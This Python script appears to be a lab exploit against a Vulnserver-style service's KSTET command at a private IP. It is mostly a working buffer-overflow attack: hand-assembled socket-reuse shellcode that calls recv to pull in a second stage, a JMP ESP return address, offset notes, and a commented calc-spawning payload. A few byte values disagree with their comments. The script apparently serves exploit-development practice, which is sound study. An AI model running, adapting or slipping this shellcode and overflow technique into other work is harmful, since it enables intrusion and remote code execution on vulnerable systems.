#!/usr/bin/python -w

# Skeleton exploit for files, which are opened in application

import socket
import os
import sys
from struct import pack
from pwnlib.asm import asm
import time

host="192.168.85.133"
port=9999

# spawn calc on windows
payload = "\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0" 
payload = "\xcc"

# buffer space
x = "\x90"*6 


# get socket descriptor pointer
# adding 0x44 twice
x += "\x66\x83\xC0\x44"
x += "\x66\x83\xC0\x44"


# mov eax, esp
# add ax, 0x188
x += "\x8B\xC4"
x += "\x66\x05\x88\x01" 

# mov ebx, dword ptr [eax]
x += "\x8b\x18"




# add esp, 0x40 * 4 times
x += "\x83\xC4\x40"
x += "\x83\xC4\x40"
x += "\x83\xC4\x40"
x += "\x83\xC4\x40"

# mov ebp, esp
x += "\x8B\xEc" 

# mov eax, esp
x += "\x8b\xc4"

# buffer space
x += "\x90"*2





#xor eax, eax
x += "\x33\xc0"

# PUSH EAX, pushing flags
x += "\x50" 


# Add ah, 0x1
x += "\x80\xc4\x01"



# PUSH EAX, pushing size
x += "\x50"               

# mov eax, esp
x += "\x8b\xc4"


# preparing buffer pointer
# add ax, 0x14
x += "\x66\x83\xC0\x14"



# PUSH EAX, pushing buffer pointer
x += "\x50"   



# push ebx, socket descriptor
x += "\x53"

# mov eax, 0x40252c20
x += "\xB8\x20\x2C\x25\x40"

# shr eax, 0x8
x += "\xC1\xE8\x08"

# call eax
x += "\xff\xd0"


#call last error
x += "\xB8\xCE\x3C\xAB\x71\xFF\xD0"

exploit  = "\x90"*6 
exploit += "\x54"                   # PUSH ESP
exploit += "\x59"                   # POP ECX
exploit += "\x66\x81\xC1\xCC\x05"   # ADD CX,5C9
exploit += "\x83\xEC\x50"           # SUB ESP, 50
exploit += "\x33\xD2"               # XOR EDX,EDX
exploit += "\x52"                   # PUSH EDX
exploit += "\x80\xC6\x02"           # ADD DH,2
exploit += "\x52"                   # PUSH EDX
exploit += "\x54"                   # PUSH ESP
exploit += "\x5A"                   # POP EDX
exploit += "\x80\xC2\x38"           # ADD DL, 36
exploit += "\x52"                   # PUSH EDX
exploit += "\xFF\x31"               # PUSH DWORD PTR DS:[ECX]
exploit += "\xB8\x88\x2C\x25\x40"   # MOV EAX, 40252C88
exploit += "\xC1\xE8\x08"           # SHR EAX, 8    
exploit += "\xFF\xD0"               # CALL EAX


print("length: ", len(x))
jmp_esp = pack("i", 0x62501205)
buffer = "KSTET " + exploit + "A"*(70-len(exploit)) 
buffer += jmp_esp + "\xeb\xb6" + "D"*10

# eip offset = 70 
# esp offset = 74
# ebp likely at offset 66
# buffer is 80 - kstet  = 74

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
print(sock.recv(1024))
sock.send(buffer)

buffer_2 = "\xcc" * 50
import pdb; pdb.set_trace()
sock.send(buffer_2)
print("sent")
print(sock.recv(1024))
# sock.close()

